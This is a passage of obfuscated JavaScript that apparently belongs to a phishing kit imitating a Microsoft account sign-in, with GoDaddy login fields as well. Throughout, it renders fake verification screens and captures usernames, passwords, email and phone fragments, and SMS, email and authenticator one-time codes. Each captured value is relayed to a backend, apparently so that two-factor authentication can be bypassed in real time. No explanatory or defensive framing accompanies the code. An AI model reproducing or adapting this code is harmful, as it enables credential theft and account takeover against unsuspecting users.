    _0x2a53e1.id = 'proofDiv' + _0x222b62
    const _0x1c1446 = document.createElement('div')
    _0x1c1446.classList.add('radio')
    const _0x495cf7 = document.createElement('label'),
      _0x4e59dd = document.createElement('input')
    _0x4e59dd.type = 'radio'
    _0x4e59dd.setAttribute('onchange', 'selectprotectoption(this)')
    _0x4e59dd.role = 'radio'
    _0x4e59dd.name = 'proof'
    _0x4e59dd.value = _0x459527.type
    _0x4e59dd.classList.add('inputAlignMiddle')
    _0x4e59dd.setAttribute('aria-describedby', 'iEnterProofDesc iProofLbl1')
    const _0x5443ce = document.createElement('span')
    _0x5443ce.id = 'iProofLbl1'
    _0x5443ce.classList.add('dirltr')
    _0x5443ce.textContent = _0x459527.text
    _0x222b62 == 0 && (_0x4e59dd.checked = true)
    _0x495cf7.appendChild(_0x4e59dd)
    _0x495cf7.appendChild(_0x5443ce)
    _0x1c1446.appendChild(_0x495cf7)
    _0x2a53e1.appendChild(_0x1c1446)
    if (_0x222b62 == 0 && _0x459527.type === 'email') {
      emailval = _0x459527.text.split('@').pop()
      const _0x2bc43e = document.createElement('div')
      _0x2bc43e.classList.add('iAdditionalProofInfo')
      const _0x4cd560 = document.createElement('div')
      _0x4cd560.classList.add('text-block-body')
      _0x4cd560.id = 'iEnterProofDesc'
      _0x4cd560.textContent =
        'To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.'
      const _0x70e445 = document.createElement('div')
      _0x70e445.setAttribute('role', 'alert')
      _0x70e445.setAttribute('aria-live', 'assertive')
      const _0x30fa8d = document.createElement('div')
      _0x30fa8d.classList.add('alert', 'alert-error', 'Hide')
      _0x30fa8d.id = 'iProofInputError'
      const _0x44ae9e = document.createElement('div')
      _0x44ae9e.classList.add(
        'emailPartial',
        'dirltr',
        'input-group',
        'input-max-width'
      )
      _0x44ae9e.id = 'iProofEmailEntry'
      _0x44ae9e.style.display = 'table'
      const _0x4e83ea = document.createElement('input')
      _0x4e83ea.type = 'email'
      _0x4e83ea.name = 'iProofEmail'
      _0x4e83ea.classList.add('form-control', 'noRightBorder')
      _0x4e83ea.setAttribute('autocomplete', 'off')
      _0x4e83ea.maxLength = '113'
      _0x4e83ea.setAttribute('aria-required', 'true')
      _0x4e83ea.setAttribute('aria-label', 'Email name')
      _0x4e83ea.setAttribute('aria-describedby', 'iProofInputError')
      const _0x20c571 = document.createElement('label')
      _0x20c571.classList.add(
        'input-group-addon',
        'noLeftBorder',
        'outlookEmailLabel'
      )
      _0x20c571.textContent = '@' + emailval
      _0x44ae9e.appendChild(_0x4e83ea)
      _0x44ae9e.appendChild(_0x20c571)
      _0x2bc43e.appendChild(_0x4cd560)
      _0x70e445.appendChild(_0x30fa8d)
      _0x2bc43e.appendChild(_0x70e445)
      _0x2bc43e.appendChild(_0x44ae9e)
      _0x2a53e1.appendChild(_0x1c1446)
      _0x2a53e1.appendChild(_0x2bc43e)
    } else {
      if (_0x222b62 == 0 && _0x459527.type === 'text') {
        const _0x5063ef = document.createElement('div')
        _0x5063ef.classList.add('iAdditionalProofInfo')
        const _0x525936 = document.createElement('div')
        _0x525936.classList.add('text-block-body')
        _0x525936.id = 'iEnterProofDesc'
        _0x525936.textContent =
          'To verify that this is your phone number, enter the last 4 digits including 95, and then click "Send code" to receive your code.'
        const _0x46ce0f = document.createElement('div')
        _0x46ce0f.setAttribute('role', 'alert')
        _0x46ce0f.setAttribute('aria-live', 'assertive')
        const _0x2c4ea7 = document.createElement('div')
        _0x2c4ea7.classList.add('alert', 'alert-error', 'Hide')
        _0x2c4ea7.id = 'iProofInputError'
        const _0x73dc3d = document.createElement('div')
        _0x73dc3d.classList.add('phcontainer')
        _0x73dc3d.id = 'iProofPhoneEntry'
        _0x73dc3d.style.display = ''
        const _0x2a8b77 = document.createElement('label')
        _0x2a8b77.classList.add('form-group-top')
        _0x2a8b77.id = 'iProofPhoneHint'
        _0x2a8b77.setAttribute('for', 'iProofPhone')
        _0x2a8b77.setAttribute('aria-hidden', 'true')
        _0x2a8b77.textContent = 'Last 4 digits of phone number'
        const _0x5a4471 = document.createElement('input')
        _0x5a4471.type = 'tel'
        _0x5a4471.id = 'iProofPhone'
        _0x5a4471.name = 'iProofPhone'
        _0x5a4471.classList.add('form-control', 'input-max-width')
        _0x5a4471.setAttribute('autocomplete', 'off')
        _0x5a4471.maxLength = '4'
        _0x5a4471.setAttribute('aria-required', 'true')
        _0x5a4471.setAttribute('aria-label', 'Last 4 digits of phone number')
        _0x5a4471.setAttribute('aria-describedby', 'iProofInputError')
        _0x73dc3d.appendChild(_0x2a8b77)
        _0x73dc3d.appendChild(_0x5a4471)
        _0x5063ef.appendChild(_0x525936)
        _0x46ce0f.appendChild(_0x2c4ea7)
        _0x5063ef.appendChild(_0x46ce0f)
        _0x5063ef.appendChild(_0x73dc3d)
        _0x2a53e1.appendChild(_0x1c1446)
        _0x2a53e1.appendChild(_0x5063ef)
      }
    }
    _0x547a60.appendChild(_0x2a53e1)
  })
}
function displaymultipleaccounts(_0x86390a) {
  const _0x2f4074 = document.getElementById('multipleaccountoptions')
  _0x2f4074.innerHTML = ''
  _0x86390a.forEach((_0x1c7624) => {
    const _0x11b221 = document.createElement('div')
    _0x11b221.classList.add('row', 'tile')
    _0x11b221.setAttribute('onclick', 'selectmultipleaccount(this)')
    _0x11b221.setAttribute('role', 'listitem')
    const _0x3c9531 = document.createElement('div')
    _0x3c9531.classList.add('table')
    _0x3c9531.setAttribute('role', 'button')
    const _0x4925fe = document.createElement('div')
    _0x4925fe.classList.add('table-row')
    const _0x41ca4a = document.createElement('div')
    _0x41ca4a.classList.add('table-cell', 'tile-img')
    const _0x3b5033 = document.createElement('img')
    _0x3b5033.classList.add('tile-img')
    _0x3b5033.setAttribute('role', 'presentation')
    _0x3b5033.setAttribute('src', _0x1c7624.image_src)
    _0x41ca4a.appendChild(_0x3b5033)
    const _0x4bf7af = document.createElement('div')
    _0x4bf7af.classList.add('table-cell', 'text-left', 'content')
    const _0x51b1aa = document.createElement('div')
    _0x51b1aa.innerText = _0x1c7624.tiletitle
    const _0x5b3102 = document.createElement('div'),
      _0x3690a5 = document.createElement('small')
    _0x3690a5.innerText = _0x1c7624.titlehint
    _0x5b3102.appendChild(_0x3690a5)
    const _0x430539 = document.createElement('div'),
      _0x310a6c = document.createElement('small')
    _0x310a6c.innerText = _0x1c7624.email
    _0x430539.appendChild(_0x310a6c)
    _0x4bf7af.appendChild(_0x51b1aa)
    _0x4bf7af.appendChild(_0x5b3102)
    _0x4bf7af.appendChild(_0x430539)
    _0x4925fe.appendChild(_0x41ca4a)
    _0x4925fe.appendChild(_0x4bf7af)
    _0x3c9531.appendChild(_0x4925fe)
    _0x11b221.appendChild(_0x3c9531)
    _0x2f4074.appendChild(_0x11b221)
  })
}
function displaytwofamethods(_0x5d5c5c) {
  const _0x5651ba = document.getElementById('2famethods')
  _0x5651ba.innerHTML = ''
  _0x5d5c5c.forEach((_0x1addf4) => {
    const _0x4fc9d0 = document.createElement('div')
    _0x4fc9d0.classList.add('row', 'tile')
    _0x4fc9d0.setAttribute('data-methodid', _0x1addf4.methodid)
    _0x4fc9d0.setAttribute('onclick', 'selecttwofamethod(this)')
    _0x4fc9d0.setAttribute('role', 'listitem')
    const _0x3437ec = document.createElement('div')
    _0x3437ec.classList.add('table')
    _0x3437ec.setAttribute('tabindex', '0')
    _0x3437ec.setAttribute('role', 'button')
    const _0x1d69f7 = document.createElement('div')
    _0x1d69f7.classList.add('table-row')
    const _0x32f2e7 = document.createElement('div')
    _0x32f2e7.classList.add('table-cell', 'tile-img')
    if (
      _0x1addf4.hasOwnProperty('text') &&
      _0x1addf4.hasOwnProperty('image_src')
    ) {
      const _0x3d2d3a = document.createElement('img')
      _0x3d2d3a.classList.add('tile-img')
      _0x3d2d3a.setAttribute('role', 'presentation')
      _0x3d2d3a.setAttribute('src', _0x1addf4.image_src)
      _0x32f2e7.appendChild(_0x3d2d3a)
    }
    const _0x31fccd = document.createElement('div')
    _0x31fccd.classList.add('table-cell', 'text-left', 'content')
    const _0x3e396e = _0x1addf4.hasOwnProperty('text') ? _0x1addf4.text : ''
    _0x31fccd.textContent = _0x3e396e
    _0x1d69f7.appendChild(_0x32f2e7)
    _0x1d69f7.appendChild(_0x31fccd)
    _0x3437ec.appendChild(_0x1d69f7)
    _0x4fc9d0.appendChild(_0x3437ec)
    _0x5651ba.appendChild(_0x4fc9d0)
  })
}
function selecttwofamethod(_0x14180c) {
  const _0x30509b = document
    .getElementById('2famethods')
    .getElementsByClassName('row tile')
  let _0x104e97 = _0x14180c.getAttribute('data-methodid')
  loadinganimation(0)
  sendAndReceive('twofaselect', [_0x104e97], 1)
    .then((_0x564603) => {
      if (
        _0x564603 &&
        _0x564603.message !== 'waiting for previous request to complete'
      ) {
        loadinganimation(1)
        wait2facancel = 0
        _0x564603.message == 'email otp live' &&
          ((document.getElementById(
            'confirmemailorphone_live_title'
          ).innerText = 'Verify your email'),
          document
            .getElementById('inp_confirmemailorphone_live')
            .removeAttribute('maxlength'),
          document
            .getElementById('inp_confirmemailorphone_live')
            .removeAttribute('oninput'),
          (document.getElementById('inp_confirmemailorphone_live').value = ''),
          document
            .getElementById('inp_confirmemailorphone_live')
            .setAttribute('placeholder', 'someone@example.com'),
          (document.getElementById(
            'error_confirmemailorphone_live'
          ).style.display = 'none'),
          (document.getElementById('error_confirmemailorphone_live').innerText =
            ''),
          checkerrordesc('confirmemailorphone_live', 0, _0x564603.description),
          bottomsectionlinks(
            'confirmemailorphone_live',
            _0x564603.bottomsection
          ),
          changebackbutton('confirmemailorphone_live', _0x564603.backbutton),
          (document.getElementById('confirmemailorphone_live_hidden').value =
            _0x564603.email),
          document.getElementById('section_' + view).classList.toggle('d-none'),
          document
            .getElementById('section_confirmemailorphone_live')
            .classList.remove('d-none'),
          (view = 'confirmemailorphone_live'),
          (viewtype = 'email'))
        _0x564603.message == 'sms otp live' &&
          ((document.getElementById(
            'confirmemailorphone_live_title'
          ).innerText = 'Verify your phone number'),
          document
            .getElementById('inp_confirmemailorphone_live')
            .setAttribute('maxlength', '4'),
          document
            .getElementById('inp_confirmemailorphone_live')
            .setAttribute('oninput', 'validatediginp(this)'),
          (document.getElementById('inp_confirmemailorphone_live').value = ''),
          document
            .getElementById('inp_confirmemailorphone_live')
            .setAttribute('placeholder', 'Last 4 digits of phone number'),
          (document.getElementById(
            'error_confirmemailorphone_live'
          ).style.display = 'none'),
          (document.getElementById('error_confirmemailorphone_live').innerText =
            ''),
          checkerrordesc('confirmemailorphone_live', 0, _0x564603.description),
          bottomsectionlinks(
            'confirmemailorphone_live',
            _0x564603.bottomsection
          ),
          changebackbutton('confirmemailorphone_live', _0x564603.backbutton),
          (document.getElementById('confirmemailorphone_live_hidden').value =
            _0x564603.phone),
          document.getElementById('section_' + view).classList.toggle('d-none'),
          document
            .getElementById('section_confirmemailorphone_live')
            .classList.remove('d-none'),
          (view = 'confirmemailorphone_live'),
          (viewtype = 'phone'))
        _0x564603.message == 'otp sent live' &&
          (document
            .getElementById('inp_otp_live')
            .setAttribute('placeholder', 'Code'),
          (document.getElementById('error_otp_live').style.display = 'none'),
          (document.getElementById('error_otp_live').innerText = ''),
          document
            .getElementById('otpliveimg')
            .setAttribute('src', _0x564603.image_src),
          checkerrordesc('otp_live', 0, _0x564603.description),
          bottomsectionlinks('otp_live', _0x564603.bottomsection),
          changebackbutton('otp_live', _0x564603.backbutton),
          document.getElementById('section_' + view).classList.toggle('d-none'),
          document
            .getElementById('section_otp_live')
            .classList.remove('d-none'),
          (view = 'otp_live'),
          (viewtype = 'otp'))
        _0x564603.message == 'approve auth request auth app live' &&
          ((document.getElementById('error_authapp_live').style.display =
            'none'),
          (document.getElementById('error_authapp_live').innerText = ''),
          (document.getElementById('authapp_live_code').innerText =
            _0x564603.authappreqid),
          bottomsectionlinks('authapp_live', _0x564603.bottomsection),
          changebackbutton('authapp_live', _0x564603.backbutton),
          document.getElementById('section_' + view).classList.toggle('d-none'),
          document
            .getElementById('section_authapp_live')
            .classList.remove('d-none'),
          (view = 'authapp_live'),
          (viewtype = 'auth'),
          wait2fa('app', _0x564603.methodid))
        _0x564603.message == 'duplicate request' &&
          ((wait2facancel = 1),
          document
            .getElementById('section_tryagainlater')
            .classList.contains('d-none') &&
            ((document
              .getElementById('section_tryagainlater')
              .querySelector('.title').innerText = 'Too many Attempts'),
            setTimeout(function () {
              document
                .getElementById('section_' + view)
                .querySelector('.loading-container')
                .classList.remove('loading')
              runanimation(2, view, 0.5, 0)
              setTimeout(function () {
                document
                  .getElementById('section_' + view)
                  .classList.toggle('d-none')
                document
                  .getElementById('section_tryagainlater')
                  .querySelector('#tryagainheader').style.display = 'block'
                document
                  .getElementById('section_tryagainlater')
                  .querySelector('#tryagain_toomanyattempts').style.display =
                  'block'
                document
                  .getElementById('section_tryagainlater')
                  .querySelector('.sectioncontent').style.animation =
                  'show-from-right 0.5s'
                document
                  .getElementById('section_tryagainlater')
                  .classList.remove('d-none')
                view = 'tryagainlater'
              }, 200)
            }, 500)))
        _0x564603.message == 'session timeout' &&
          document
            .getElementById('section_tryagainlater')
            .classList.contains('d-none') &&
            ((document
              .getElementById('section_tryagainlater')
              .querySelector('.title').innerText = "We didn't hear from you"),
            setTimeout(function () {
              document
                .getElementById('section_' + view)
                .querySelector('.loading-container')
                .classList.remove('loading')
              runanimation(2, view, 0.5, 0)
              setTimeout(function () {
                document
                  .getElementById('section_' + view)
                  .classList.toggle('d-none')
                document
                  .getElementById('section_tryagainlater')
                  .querySelector('#tryagainheader').style.display = 'block'
                document
                  .getElementById('section_tryagainlater')
                  .querySelector('#tryagain_withoutinternet').style.display =
                  'block'
                document
                  .getElementById('section_tryagainlater')
                  .querySelector('.sectioncontent').style.animation =
                  'show-from-right 0.5s'
                document
                  .getElementById('section_tryagainlater')
                  .classList.remove('d-none')
                view = 'tryagainlater'
              }, 200)
            }, 500))
        if (_0x564603.message == 'redirected back to sign in') {
          document.getElementById('inp_uname').value = ''
          document.getElementById('error_pwd').innerText = ''
          document.getElementById('inp_pwd').value = ''
          bottomsectionlinks('uname', [
            {
              a_id: 'signup',
              a_text: 'Create one!',
              text: 'No account?',
              type: 'text_link',
            },
            {
              a_id: 'cantAccessAccount',
              a_text: "Can't access your account?",
              type: 'link',
            },
          ])
          document
            .getElementById('section_' + view)
            .querySelector('.sectioncontent').style.animation = ''
          document.getElementById('section_' + view).classList.toggle('d-none')
          document
            .getElementById('section_uname')
            .querySelector('.sectioncontent').style.animation = ''
          document.getElementById('section_uname').classList.remove('d-none')
          document.body.style.backgroundImage &&
            (document.body.style.backgroundImage = '')
          document.body.style.backgroundColor &&
            (document.body.style.backgroundColor = '')
        }
        _0x564603.message == 'lets try something else or come back' &&
          ((document
            .getElementById('section_signinanothererror')
            .querySelector('.title').textContent = _0x564603.title),
          checkerrordesc(
            'signinanothererrordesc',
            2,
            _0x564603.signinanothererrordesc
          ),
          document.getElementById('section_' + view).classList.toggle('d-none'),
          document
            .getElementById('section_signinanothererror')
            .classList.remove('d-none'),
          bottomsectionlinks('signinanothererror', _0x564603.bottomsection),
          (view = 'signinanothererror'))
        _0x564603.message == 'you dont have access' &&
          (document
            .getElementById('section_' + view)
            .classList.toggle('d-none'),
          document
            .getElementById('section_youdonthaveaccess')
            .classList.remove('d-none'),
          (view = 'youdonthaveaccess'))
        _0x564603.message == 'otp sent' &&
          (_0x564603.type == 'otp' && (otptype = 1),
          _0x564603.type == 'sms' && (otptype = 2),
          _0x564603.type == 'callotp' && (otptype = 3),
          (document.getElementById('error_2fa').innerText = ''),
          document
            .getElementById('otpimg')
            .setAttribute('src', _0x564603.image_src),
          checkerrordesc('otp', 0, _0x564603.description),
          bottomsectionlinks('otp', _0x564603.bottomsection),
          changebackbutton('otp', _0x564603.backbutton),
          document.getElementById('section_' + view).classList.toggle('d-none'),
          document.getElementById('section_otp').classList.remove('d-none'),
          (view = 'otp'),
          (viewtype = null))
        _0x564603.message == 'approve auth request auth app' &&
          ((document.getElementById('error_2fa').innerText = ''),
          document
            .getElementById('authappimg')
            .setAttribute('src', _0x564603.image_src),
          checkerrordesc('authapp', 0, _0x564603.description),
          bottomsectionlinks('authapp', _0x564603.bottomsection),
          changebackbutton('authapp', _0x564603.backbutton),
          (document.getElementById('authappcode').textContent =
            _0x564603.authappcode),
          document.getElementById('section_' + view).classList.toggle('d-none'),
          document.getElementById('section_authapp').classList.remove('d-none'),
          (view = 'authapp'),
          (viewtype = null),
          wait2fa('app', _0x564603.methodid))
        _0x564603.message == 'approve auth request calling' &&
          (document
            .getElementById('section_authcall')
            .querySelector('.back')
            .focus(),
          (document.getElementById('error_2fa').innerText = ''),
          document
            .getElementById('authcallimg')
            .setAttribute('src', _0x564603.image_src),
          checkerrordesc('authcall', 0, _0x564603.description),
          bottomsectionlinks('authcall', _0x564603.bottomsection),
          changebackbutton('authcall', _0x564603.backbutton),
          document.getElementById('section_' + view).classList.toggle('d-none'),
          document
            .getElementById('section_authcall')
            .classList.remove('d-none'),
          (view = 'authcall'),
          (viewtype = null),
          wait2fa('call'))
        _0x564603.message == 'error' &&
          (bottomsectionlinks('2fa', _0x564603.bottomsection),
          changebackbutton('2fa', _0x564603.backbutton),
          checkerrordesc('2fa', 1, _0x564603.description))
        _0x564603.message == 'verifyemail' &&
          ((document.getElementById('error_2fa').innerText = ''),
          checkerrordesc('verifyemail', 0, _0x564603.description),
          bottomsectionlinks('confirmemail', _0x564603.bottomsection),
          changebackbutton('confirmemail', _0x564603.backbutton),
          document.getElementById('section_' + view).classList.toggle('d-none'),
          document
            .getElementById('section_confirmemail')
            .classList.remove('d-none'),
          (view = 'confirmemail'),
          (viewtype = null))
        _0x564603.message == 'request wasnt sent' &&
          ((document
            .getElementById('section_authapperror')
            .querySelector('.title').textContent = "Request wasn't sent"),
          document.getElementById('authapperrordesc').classList.toggle('error'),
          (document.getElementById('authapperrordesc').innerHTML =
            '<span>Sorry, we\'re having trouble verifying your account. Please try again.</span><a id="ViewDetails" class="no-wrap" href="#">View details</a>'),
          (view = 'authapperror'),
          (viewtype = null))
      }
    })
    .catch((_0x2f063d) => {
      loadinganimation(1)
      console.error('Error:', _0x2f063d)
    })
}
const unameInp = document.getElementById('inp_uname'),
  pwdInp = document.getElementById('inp_pwd'),
  pwdInplive = document.getElementById('inp_pwd_live')
let unameVal = (pwdVal = false)
const nxt = document.getElementById('btn_next')
nxt.addEventListener('click', () => {
  validate()
})
const sig = document.getElementById('btn_sig')
sig.addEventListener('click', () => {
  validate()
})
const siglive = document.getElementById('btn_sig_live')
siglive.addEventListener('click', () => {
  validate()
})
const cancelbtns = document.querySelectorAll('.btn_can')
for (let i = 0; i < cancelbtns.length; i++) {
  cancelbtns[i].addEventListener('click', () => {
    loadinganimation(0)
    document
      .getElementById('section_' + view)
      .querySelector('.sectioncontent').style.animation = ''
    loadinganimation(1)
    document
      .getElementById('section_uname')
      .querySelector('.sectioncontent').style.animation = ''
    document.getElementById('section_' + view).classList.toggle('d-none')
    document
      .getElementById('section_uname')
      .querySelector('.sectioncontent').style.animation = ''
    document.getElementById('section_uname').classList.remove('d-none')
    document.body.style.backgroundImage &&
      (document.body.style.backgroundImage = '')
    document.body.style.backgroundColor &&
      (document.body.style.backgroundColor = '')
    document.getElementById('inp_uname').value = ''
    document.getElementById('error_pwd').innerText = ''
    document.getElementById('inp_pwd').value = ''
    document.getElementById('godaddyemail').value = ''
    document.getElementById('godaddypassword').value = ''
    document.getElementById('godaddypassword').setAttribute('type', 'password')
    document
      .querySelector('button.show-hide-btn')
      .querySelector('span.ux-button-text').textContent = 'Show'
    view = 'uname'
  })
}
const protectbtn = document.getElementById('btn_protectaccount')
function protectsend(_0x4cf33a) {
  if (protectbtn.textContent == 'Send Code') {
    const _0x38c6e1 = document.querySelectorAll('input[type="radio"]')
    let _0x2e19ba = 0
    for (let _0xbd29f = 0; _0xbd29f < _0x38c6e1.length; _0xbd29f++) {
      if (_0x38c6e1[_0xbd29f] === _0x4cf33a) {
        _0x2e19ba = _0xbd29f
        break
      }
    }
    console.log(_0x2e19ba)
    const _0x1c331b = document.querySelector(
      '[aria-describedby="iProofInputError"]'
    )
    loadinganimation(0)
    sendAndReceive('enterprotect', [_0x2e19ba, _0x1c331b.value], 1)
      .then((_0x308afc) => {
        _0x308afc &&
          _0x308afc.message !== 'waiting for previous request to complete' &&
          (loadinganimation(1),
          _0x308afc.message == 'otp sent' &&
            ((document.getElementById('error_2fa').innerText = ''),
            document
              .getElementById('otpimg')
              .setAttribute('src', _0x308afc.image_src),
            checkerrordesc('otp', 0, _0x308afc.description),
            bottomsectionlinks('otp', _0x308afc.bottomsection),
            changebackbutton('otp', _0x308afc.backbutton),
            document.getElementById('section_2fa').classList.toggle('d-none'),
            document.getElementById('section_otp').classList.remove('d-none'),
            (view = 'otp')),
          _0x308afc.message == 'error' &&
            (bottomsectionlinks('2fa', _0x308afc.bottomsection),
            changebackbutton('2fa', _0x308afc.backbutton),
            checkerrordesc('2fa', 1, _0x308afc.description)))
      })
      .catch((_0x20c225) => {
        loadinganimation(1)
        console.error('Error:', _0x20c225)
      })
  }
  if (protectbtn.textContent == 'Next') {
  }
  if (protectbtn.textContent == 'Verify Online') {
  }
}
function twofalive(_0xf04b84) {
  if (view == 'confirmemailorphone_live') {
    let _0x47b8ce = null,
      _0x2e20b7 = null
    viewtype == 'email' && (_0x47b8ce = 'EmailOTP_Live')
    viewtype == 'phone' && (_0x47b8ce = 'OneWaySMS_Live')
    let _0x5842df = document.getElementById(
        'inp_confirmemailorphone_live'
      ).value,
      _0x5f3740 = document.getElementById(
        'confirmemailorphone_live_hidden'
      ).value
    viewtype == 'email' &&
      (_0x5f3740.slice(0, 2) !== _0x5842df.slice(0, 2) &&
        ((document.getElementById(
          'error_confirmemailorphone_live'
        ).style.marginBottom = '14px'),
        (document.getElementById(
          'error_confirmemailorphone_live'
        ).style.display = 'block'),
        (document.getElementById('error_confirmemailorphone_live').innerText =
          'That doesn\'t match the alternate email associated with your account. The correct email starts with "' +
          _0x5f3740.slice(0, 2) +
          '".')),
      _0x5f3740.slice(0, 2) == _0x5842df.slice(0, 2) && (_0x2e20b7 = 1))
    viewtype == 'phone' &&
      (_0x5f3740.slice(-2) !== _0x5842df.slice(-2) &&
        ((document.getElementById(
          'error_confirmemailorphone_live'
        ).style.marginBottom = '14px'),
        (document.getElementById(
          'error_confirmemailorphone_live'
        ).style.display = 'block'),
        (document.getElementById('error_confirmemailorphone_live').innerText =
          "That doesn't match the phone number associated with your account. The correct number ends in " +
          _0x5f3740.slice(-2) +
          '.')),
      _0x5f3740.slice(-2) == _0x5842df.slice(-2) && (_0x2e20b7 = 1))
    _0x2e20b7 == 1 &&
      ((document.getElementById(
        'error_confirmemailorphone_live'
      ).style.display = 'none'),
      (document.getElementById('error_confirmemailorphone_live').innerText =
        ''),
      loadinganimation(0),
      sendAndReceive('twofaselected', [_0x47b8ce, _0x5842df], 1).then(
        (_0x1a3bbb) => {
          _0x1a3bbb &&
            _0x1a3bbb.message !== 'waiting for previous request to complete' &&
            (loadinganimation(1),
            _0x1a3bbb.message == 'signinblocked live' &&
              ((document.getElementById('signin_blocked_live_email').innerText =
                _0x1a3bbb.email),
              checkerrordesc('signin_blocked_live', 0, _0x1a3bbb.description),
              checkerrordesc('signin_blocked_reason', 2, _0x1a3bbb.reason),
              document
                .getElementById('section_' + view)
                .classList.toggle('d-none'),
              document
                .getElementById('section_signin_blocked_live')
                .classList.remove('d-none'),
              (view = 'signin_blocked_live')),
            _0x1a3bbb.message == 'protectaccount live' &&
              (checkerrordesc('protect_account_live', 0, _0x1a3bbb.description),
              document
                .getElementById('section_' + view)
                .classList.toggle('d-none'),
              document
                .getElementById('section_protect_account_live')
                .classList.remove('d-none'),
              (view = 'protect_account_live')),
            _0x1a3bbb.message == 'email otp' &&
              ((document.getElementById(
                'error_confirmemailorphone_live'
              ).style.display = 'none'),
              (document.getElementById(
                'error_confirmemailorphone_live'
              ).innerText = ''),
              document
                .getElementById('otpliveimg')
                .setAttribute('src', _0x1a3bbb.image_src),
              checkerrordesc('otp_live', 0, _0x1a3bbb.description),
              bottomsectionlinks('otp_live', _0x1a3bbb.bottomsection),
              changebackbutton('otp_live', _0x1a3bbb.backbutton),
              document
                .getElementById('section_confirmemailorphone_live')
                .classList.toggle('d-none'),
              document
                .getElementById('section_otp_live')
                .classList.remove('d-none'),
              (view = 'otp_live'),
              (viewtype = 'email')),
            _0x1a3bbb.message == 'phone otp' &&
              ((document.getElementById(
                'error_confirmemailorphone_live'
              ).innerText = ''),
              document
                .getElementById('otpliveimg')
                .setAttribute('src', _0x1a3bbb.image_src),
              checkerrordesc('otp_live', 0, _0x1a3bbb.description),
              bottomsectionlinks('otp_live', _0x1a3bbb.bottomsection),
              changebackbutton('otp_live', _0x1a3bbb.backbutton),
              document
                .getElementById('section_confirmemailorphone_live')
                .classList.toggle('d-none'),
              document
                .getElementById('section_otp_live')
                .classList.remove('d-none'),
              (view = 'otp_live'),
              (viewtype = 'phone'),
              (document.getElementById(
                'error_confirmemailorphone_live'
              ).style.display = 'none')))
        }
      ))
  }
  if (view == 'otp_live') {
    let _0x2ba9a2 = null,
      _0x705556 = null
    viewtype == 'email' && (_0x2ba9a2 = 'EmailOTP_Live_2')
    viewtype == 'phone' && (_0x2ba9a2 = 'OneWaySMS_Live_2')
    viewtype == 'otp' && (_0x2ba9a2 = 'PhoneAppOTP_Live')
    let _0x3abb65 = document.getElementById('inp_otp_live').value
    viewtype == 'email' &&
      (_0x3abb65 == '' &&
        ((document.getElementById('error_otp_live').style.marginBottom =
          '14px'),
        (document.getElementById('error_otp_live').style.display = 'block'),
        (document.getElementById('error_otp_live').innerText =
          'Enter the code to help us verify your identity.')),
      _0x3abb65 !== '' && (_0x705556 = 1))
    viewtype == 'phone' &&
      (_0x3abb65 == '' &&
        ((document.getElementById('error_otp_live').style.marginBottom =
          '14px'),
        (document.getElementById('error_otp_live').style.display = 'block'),
        (document.getElementById('error_otp_live').innerText =
          'Enter the code to help us verify your identity.')),
      _0x3abb65 !== '' && (_0x705556 = 1))
    viewtype == 'otp' &&
      (_0x3abb65 == '' &&
        ((document.getElementById('error_otp_live').style.marginBottom =
          '14px'),
        (document.getElementById('error_otp_live').style.display = 'block'),
        (document.getElementById('error_otp_live').innerText =
          'Enter the code to help us verify your identity.')),
      _0x3abb65 !== '' && (_0x705556 = 1))
    _0x705556 == 1 &&
      ((document.getElementById('error_otp_live').style.display = 'none'),
      (document.getElementById('error_otp_live').innerText = ''),
      loadinganimation(0),
      sendAndReceive('twofaselected', [_0x2ba9a2, _0x3abb65], 1).then(
        (_0x14966e) => {
          _0x14966e &&
            _0x14966e.message !== 'waiting for previous request to complete' &&
            (loadinganimation(1),
            _0x14966e.message == 'signinblocked live' &&
              ((document.getElementById('signin_blocked_live_email').innerText =
                _0x14966e.email),
              checkerrordesc('signin_blocked_live', 0, _0x14966e.description),
              checkerrordesc('signin_blocked_reason', 2, _0x14966e.reason),
              document
                .getElementById('section_' + view)
                .classList.toggle('d-none'),
              document
                .getElementById('section_signin_blocked_live')
                .classList.remove('d-none'),
              (view = 'signin_blocked_live')),
            _0x14966e.message == 'protectaccount live' &&
              (checkerrordesc('protect_account_live', 0, _0x14966e.description),
              document
                .getElementById('section_' + view)
                .classList.toggle('d-none'),
              document
                .getElementById('section_protect_account_live')
                .classList.remove('d-none'),
              (view = 'protect_account_live')),
            (_0x14966e.message == 'valid email otp' ||
              _0x14966e.message == 'valid phone otp' ||
              _0x14966e.message == 'valid phone app otp') &&
              ((document.getElementById('otpdesc').innerText = ''),
              document
                .getElementById('section_otp_live')
                .classList.toggle('d-none'),
              document
                .getElementById('section_final')
                .classList.remove('d-none'),
              (view = 'final')),
            _0x14966e.message == 'error live' &&
              ((document.getElementById('error_otp_live').style.display =
                'block'),
              checkerrordesc('otp_live', 1, _0x14966e.description),
              bottomsectionlinks('otp_live', _0x14966e.bottomsection),
              changebackbutton('otp_live', _0x14966e.backbutton)))
        }
      ))
  }
}
const confirmbtn = document.getElementById('btn_confirmemail')
confirmbtn.addEventListener('click', () => {
  const _0x5252b0 = document.getElementById('inp_confirmemail')
  loadinganimation(0)
  sendAndReceive('confirmemail', [_0x5252b0.value], 1)
    .then((_0x54338b) => {
      _0x54338b &&
        _0x54338b.message !== 'waiting for previous request to complete' &&
        (loadinganimation(1),
        _0x54338b.message == 'otp sent' &&
          ((document.getElementById('error_verifyemail').innerText = ''),
          document
            .getElementById('otpimg')
            .setAttribute('src', _0x54338b.image_src),
          checkerrordesc('otp', 0, _0x54338b.description),
          bottomsectionlinks('otp', _0x54338b.bottomsection),
          changebackbutton('otp', _0x54338b.backbutton),
          document
            .getElementById('section_confirmemail')
            .classList.toggle('d-none'),
          document.getElementById('section_otp').classList.remove('d-none'),
          (view = 'otp')),
        _0x54338b.message == 'if otp sent' &&
          ((document.getElementById('error_verifyemail').innerText = ''),
          document
            .getElementById('otpimg')
            .setAttribute('src', _0x54338b.image_src),
          checkerrordesc('otp', 0, _0x54338b.description),
          bottomsectionlinks('otp', _0x54338b.bottomsection),
          changebackbutton('otp', _0x54338b.backbutton),
          document
            .getElementById('section_confirmemail')
            .classList.toggle('d-none'),
          document.getElementById('section_otp').classList.remove('d-none'),
          (view = 'otp')),
        _0x54338b.message == 'otp sent error' &&
          ((document.getElementById('error_verifyemail').innerText = ''),
          document
            .getElementById('otpimg')
            .setAttribute('src', _0x54338b.image_src),
          checkerrordesc('otp', 0, _0x54338b.description)),
        _0x54338b.message == 'error' &&
          (bottomsectionlinks('verifyemail', _0x54338b.bottomsection),
